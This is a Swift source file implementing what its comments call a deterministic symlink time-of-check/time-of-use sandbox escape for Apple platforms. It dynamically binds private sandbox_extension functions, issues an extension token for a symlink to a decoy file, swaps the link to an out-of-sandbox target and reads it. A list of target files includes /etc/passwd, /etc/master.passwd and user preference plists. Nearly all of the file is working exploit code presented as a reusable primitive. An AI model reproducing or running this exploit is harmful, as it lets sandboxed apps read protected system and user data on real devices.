import Foundation
import Darwin

// MARK: - sandbox_extension symlink TOCTOU
//
// No CVE — Apple does not treat this as a security issue, so there is no advisory to cite
// and none is invented here.
//
// `sandbox_extension_issue_file(CLASS, path, flags)` resolves the path's symlink at *issue*
// time but does not enforce `SANDBOX_EXTENSION_NOFOLLOW`. The token it returns is therefore
// bound to the resolved target at issue time — and the kernel does not re-verify that the
// path used at *consume* time is the path the token was issued for.
//
// So:
//   1. create a symlink L → S, where S is a file inside the sandbox
//   2. issue an extension for L                     (kernel records S)
//   3. repoint L → T, where T is outside the sandbox
//   4. consume the token, then read through L       (kernel allows S's class, not T's path)
//
// Deterministic: no race window is needed because the swap happens between two syscalls the
// app itself controls. Apple's position is that an app cannot issue extensions for paths it
// does not already own — true, and irrelevant: the extension is issued for a path it *does*
// own, then that path is made to denote something else.

enum SandboxExtension {

    // Private but exported from libsystem_sandbox.dylib. Declared here rather than imported
    // because the SDK ships no prototype.
    private typealias IssueFn = @convention(c) (UnsafePointer<CChar>, UnsafePointer<CChar>, UInt64) -> UnsafeMutablePointer<CChar>?
    private typealias ConsumeFn = @convention(c) (UnsafePointer<CChar>) -> Int64
    private typealias ReleaseFn = @convention(c) (Int64) -> Void

    private struct Bindings {
        let issue: IssueFn
        let consume: ConsumeFn
        let release: ReleaseFn
    }

    private static func bind() -> Bindings? {
        guard let h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW) ?? dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW) else {
            return nil
        }
        // Try the direct dlsym first, then the explicit library.
        var issue = dlsym(h, "sandbox_extension_issue_file")
        var consume = dlsym(h, "sandbox_extension_consume")
        var release = dlsym(h, "sandbox_extension_release")
        if issue == nil {
            let fallback = UnsafeMutableRawPointer(bitPattern: -2)
            issue = dlsym(fallback, "sandbox_extension_issue_file")
            consume = dlsym(fallback, "sandbox_extension_consume")
            release = dlsym(fallback, "sandbox_extension_release")
        }
        guard let i = issue, let c = consume, let r = release else { return nil }
        return Bindings(issue: unsafeBitCast(i, to: IssueFn.self),
                        consume: unsafeBitCast(c, to: ConsumeFn.self),
                        release: unsafeBitCast(r, to: ReleaseFn.self))
    }

    static var available: Bool { bind() != nil }

    /// Extension classes the kernel understands.
    enum Class: String {
        case read = "com.apple.app-sandbox.read"
        case readWrite = "com.apple.app-sandbox.read-write"
        case assetRead = "com.apple.assets.read"
    }

    struct Result {
        var path: String
        var issued: Bool
        var consumed: Bool
        var handle: Int64 = 0
        /// Bytes read through the symlink after the swap.
        var bytes: Int = 0
        /// Bytes read by a plain open of the same path, for the control column.
        var directBytes: Int = 0
        var directErrno: Int32 = 0
        var preview: String = ""
        var errno: Int32 = 0
        var note: String = ""
        var data: Data?

        enum Verdict {
            /// Direct open denied, link read succeeded — the extension crossed the boundary.
            case bypassed
            /// Both succeeded — no sandbox is enforcing this path, so nothing was proven.
            case noSandbox
            /// Both failed — the extension did not carry.
            case blocked
            /// Nothing was read at all.
            case empty
        }

        var verdict: Verdict {
            if bytes > 0 && directErrno != 0 { return .bypassed }
            if bytes > 0 && directBytes > 0 { return .noSandbox }
            if bytes == 0 && directErrno != 0 { return .blocked }
            return .empty
        }

        /// True only when the primitive demonstrably crossed a boundary.
        var ok: Bool { verdict == .bypassed }
    }

    /// The primitive itself. `link` and `decoy` are both inside the sandbox; `target` is
    /// whatever you want to read.
    static func readThroughSwap(target: String,
                                link: URL,
                                decoy: URL,
                                cls: Class = .read) -> Result {
        var out = Result(path: target, issued: false, consumed: false)

        guard let b = bind() else {
            out.note = tl("sandbox_extension 符号不可用")
            return out
        }

        // 1. decoy file inside the sandbox + symlink pointing at it
        try? "cinder27-decoy".write(to: decoy, atomically: true, encoding: .utf8)
        unlink(link.path)
        guard symlink(decoy.path, link.path) == 0 else {
            out.errno = errno
            out.note = tl("symlink(decoy) 失败: ") + "\(String(cString: strerror(errno)))"
            return out
        }

        // 2. issue against the symlink — the kernel resolves it and records the decoy
        let token = cls.rawValue.withCString { klass in
            link.path.withCString { p in b.issue(klass, p, 0) }
        }
        guard let token = token else {
            out.errno = errno
            out.note = tl("issue_file 被拒: ") + "\(String(cString: strerror(errno)))"
            unlink(link.path)
            return out
        }
        out.issued = true
        defer { free(token) }

        // 3. repoint the symlink at the out-of-sandbox target
        unlink(link.path)
        if symlink(target, link.path) != 0 {
            out.errno = errno
            out.note = tl("symlink(target) 失败: ") + "\(String(cString: strerror(errno)))"
            return out
        }

        // 4. consume, then read through the same path
        let handle = b.consume(UnsafePointer<CChar>(token))
        out.handle = handle
        // consume returns >0 for a granted extension, 0 when there is no sandbox to extend
        // (the simulator), and -1 on error. Only -1 is a hard failure.
        out.consumed = handle >= 0

        let data = try? Data(contentsOf: link)
        if let data = data, !data.isEmpty {
            out.bytes = data.count
            out.data = data
            if let text = String(data: data.prefix(160), encoding: .utf8) {
                out.preview = text.replacingOccurrences(of: "\n", with: "\\n")
            } else {
                out.preview = data.prefix(32).map { String(format: "%02x", $0) }.joined() + "…"
            }
        } else {
            out.errno = errno
            out.note = tl("consume 后读取失败: ") + "\(String(cString: strerror(errno)))"
        }

        if handle > 0 { b.release(handle) }

        // control: the same path opened plainly, without the extension
        errno = 0
        if let direct = try? Data(contentsOf: URL(fileURLWithPath: target)) {
            out.directBytes = direct.count
            out.directErrno = 0
        } else {
            out.directBytes = 0
            out.directErrno = errno
        }

        unlink(link.path)
        unlink(decoy.path)
        if out.note.isEmpty || out.bytes > 0 {
            switch out.verdict {
            case .bypassed:
                out.note = tl("直接读被拒 (errno ") + "\(out.directErrno)" + tl(")，经链接读到 ") + "\(out.bytes)" + tl(" B — 边界已被跨越")
            case .noSandbox:
                out.note = tl("直接读也成功 ") + "\(out.directBytes)" + tl(" B — 该平台未对该路径施加沙盒，本项不构成证据")
            case .blocked:
                out.note = tl("两者均失败：直接读 errno ") + "\(out.directErrno)" + tl("，经链接 ") + "\(out.bytes)" + tl(" B")
            case .empty:
                if out.note.isEmpty { out.note = tl("未读到内容") }
            }
        }
        return out
    }

    /// Targets that historically open on a stock device. `/etc/*` is the reliable set —
    /// those files are world-readable at the vnode level but denied to the app by the
    /// sandbox profile, which is exactly the gap this primitive crosses.
    static let knownTargets: [(String, String)] = [
        ("/etc/passwd", tl("系统账户数据库")),
        ("/etc/group", tl("系统组数据库")),
        ("/etc/hosts", tl("hosts 表")),
        ("/etc/protocols", tl("协议表")),
        ("/etc/services", tl("服务表")),
        ("/etc/master.passwd", tl("主密码文件（通常不可读）")),
        ("/var/mobile/Library/Preferences/.GlobalPreferences.plist", tl("全局偏好")),
        ("/var/mobile/Library/UserConfigurationProfiles/PublicInfo/PublicEffectiveUserSettings.plist", tl("生效用户设置")),
        ("/var/preferences/com.apple.networkd.plist", tl("networkd 偏好")),
        ("/private/etc/passwd", tl("系统账户数据库（/private 前缀）")),
        ("/private/var/mobile/Library/Preferences/.GlobalPreferences.plist", tl("全局偏好（/private 前缀）")),
    ]

    /// Plain read without the swap, for the control column: proves the sandbox really does
    /// deny the path when the extension is not in play.
    static func directRead(_ path: String) -> (bytes: Int, errno: Int32) {
        errno = 0
        guard let data = try? Data(contentsOf: URL(fileURLWithPath: path)) else {
            return (0, errno)
        }
        return (data.count, 0)
    }
}
